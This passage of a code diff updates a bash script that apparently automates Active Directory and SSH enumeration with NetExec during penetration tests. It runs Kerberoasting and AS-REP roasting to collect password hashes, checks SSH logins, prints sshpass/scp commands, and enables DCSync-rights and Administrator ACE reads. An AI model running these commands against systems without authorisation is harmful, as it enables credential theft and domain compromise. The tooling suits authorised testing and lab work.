-        unbuffer nxc smb $IP $USER_FLAG -M enum_av  | tee nxc-enum/ldap/anti_virus.txt  
+        unbuffer nxc smb $IP $USER_FLAG -M enum_av 2>/dev/null | tee nxc-enum/ldap/anti_virus.txt  
     
         echo -e "\n\033[96m[+] LDAP Module Enumeration:\033[0m"
     
         echo -e "\n\033[91m[+] Machine Account Quota (maq)\033[0m\n"
-        unbuffer nxc ldap $IP $USER_FLAG --users -M maq | tee nxc-enum/ldap/maq.txt
+        unbuffer nxc ldap $IP $USER_FLAG --users -M maq 2>/dev/null | tee nxc-enum/ldap/maq.txt
     
         echo -e "\n\033[91m[+] ADCS Templates\033[0m\n"
-        unbuffer nxc ldap $IP $USER_FLAG --users -M adcs | tee nxc-enum/ldap/adcs.txt
+        unbuffer nxc ldap $IP $USER_FLAG --users -M adcs 2>/dev/null | tee nxc-enum/ldap/adcs.txt
     
         echo -e "\n\033[91m[+] User Description\033[0m\n"
-        unbuffer nxc ldap $IP $USER_FLAG --users -M get-desc-users | tee nxc-enum/ldap/desc-users.txt
+        unbuffer nxc ldap $IP $USER_FLAG --users -M get-desc-users 2>/dev/null | tee nxc-enum/ldap/desc-users.txt
     
         echo -e "\n\033[91m[+] LDAP Checker\033[0m\n"
-        unbuffer nxc ldap $IP $USER_FLAG --users -M ldap-checker | tee nxc-enum/ldap/ldap-checker.txt
+        unbuffer nxc ldap $IP $USER_FLAG --users -M ldap-checker 2>/dev/null | tee nxc-enum/ldap/ldap-checker.txt
     
         echo -e "\n\033[91m[+] Password Not Required\033[0m\n"
-        unbuffer nxc ldap $IP $USER_FLAG --users --password-not-required | tee nxc-enum/ldap/password-not-required.txt
+        unbuffer nxc ldap $IP $USER_FLAG --users --password-not-required 2>/dev/null | tee nxc-enum/ldap/password-not-required.txt
     
         echo -e "\n\033[91m[+] Trusted For Delegation\033[0m\n"
-        unbuffer nxc ldap $IP $USER_FLAG --users --trusted-for-delegation | tee nxc-enum/ldap/trusted-for-delegation.txt
+        unbuffer nxc ldap $IP $USER_FLAG --users --trusted-for-delegation 2>/dev/null | tee nxc-enum/ldap/trusted-for-delegation.txt
     
         echo -e "\n\033[91m[+] Kerberoasting\033[0m\n"
         rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
-        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt
+        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt 2>/dev/null
         if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
             cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
             echo -e "\033[92m[+] Kerberoast hashes found! Saved to kerberoasting.txt\033[0m"
@@ -687,7 +818,7 @@ if [ "$os_type" = "windows" ]; then
     
         echo -e "\n\033[91m[+] AS-REProasting\033[0m\n"
         rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
-        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt
+        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt 2>/dev/null
         if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
             cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
             echo -e "\033[92m[+] AS-REP hashes found! Saved to asreproasting.txt\033[0m"
@@ -712,7 +843,7 @@ if [ "$os_type" = "windows" ]; then
             echo ""
         fi
     else
-        echo -e "\n\033[93m[!] Skipping LDAP Enumeration & Roasting (no username supplied)\033[0m"
+        echo -e "\n\033[93m[!] Skipping LDAP Module Enumeration & Roasting (requires username AND password/hash)\033[0m"
     fi
     
     if [ -n "$user" ]; then
@@ -800,7 +931,24 @@ if [ -n "$user" ]; then
     echo -e "\n\033[96m[+] SSH Enumeration:\033[0m"
 
     echo -e "\n\033[91m[+] SSH Credentials Check\033[0m\n"
-    unbuffer nxc ssh $IP $USER_FLAG | tee nxc-enum/smb/ssh-credentials.txt
+    ssh_output=$(unbuffer nxc ssh $IP $USER_FLAG | tee nxc-enum/smb/ssh-credentials.txt)
+    echo "$ssh_output"
+    
+    # Check if SSH access was successful and suggest connection
+    if echo "$ssh_output" | grep -q "\[+\].*Shell access"; then
+        echo -e "\n\033[92m[+] SSH access successful! Connect with:\033[0m"
+        echo "ssh -o StrictHostKeyChecking=no $user@$IP"
+        echo ""
+        echo "# Or with password in command (less secure):"
+        echo "sshpass -p '$pass' ssh -o StrictHostKeyChecking=no $user@$IP"
+        echo ""
+        echo "# Copy files from remote:"
+        echo "scp -o StrictHostKeyChecking=no $user@$IP:/path/to/file ."
+        echo ""
+        echo "# Copy files to remote:"
+        echo "scp -o StrictHostKeyChecking=no localfile $user@$IP:/path/to/destination"
+        echo ""
+    fi
 
     echo -e "\n\033[91m[+] SSH Command Execution (whoami)\033[0m\n"
     unbuffer nxc ssh $IP $USER_FLAG -x whoami | tee nxc-enum/smb/ssh-whoami.txt
@@ -816,10 +964,26 @@ else
     echo -e "\n\033[93m[!] Skipping SSH/FTP Enumeration (no username supplied)\033[0m"
 fi
 
-# Commented as it may be an auto-exploitation feature (OSCP exam)
-
-# echo -e "\n\033[91m[+] Administrator's ACE\033[0m\n"
-# unbuffer nxc ldap $IP -u $user -p $pass -M daclread -o TARGET=Administrator ACTION=read | tee nxc-enum/ldap/admin-ace.txt # Read all the ACEs of the Administrator
-
-# echo -e "\n\033[91m[+] DCSync Rights\033[0m\n"
-# nxc ldap $IP -u $user -p $pass -M daclread -o TARGET_DN="DC=lunar,DC=eruca,DC=com" ACTION=read RIGHTS=DCSync # principals that have DCSync rights
+# Advanced DACL enumeration (requires credentials)
+if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
+    echo -e "\n\033[96m[+] Advanced DACL Enumeration:\033[0m"
+    
+    echo -e "\n\033[91m[+] Administrator's ACE\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read 2>/dev/null | tee nxc-enum/ldap/admin-ace.txt
+    
+    # Build domain DN from domain name
+    if [ -n "$domain" ]; then
+        # Convert domain.local to DC=domain,DC=local
+        domain_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
+        
+        echo -e "\n\033[91m[+] DCSync Rights\033[0m\n"
+        unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET_DN="$domain_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | tee nxc-enum/ldap/dcsync-rights.txt
+        
+        echo -e "\n\033[96m[+] What these checks reveal:\033[0m"
+        echo "  - Administrator ACE: Shows who can modify the Administrator account"
+        echo "  - DCSync Rights: Shows who can dump domain credentials (critical finding!)"
+        echo ""
+    else
+        echo -e "\n\033[93m[!] Skipping DCSync rights check (no domain name provided)\033[0m"
+    fi
+fi
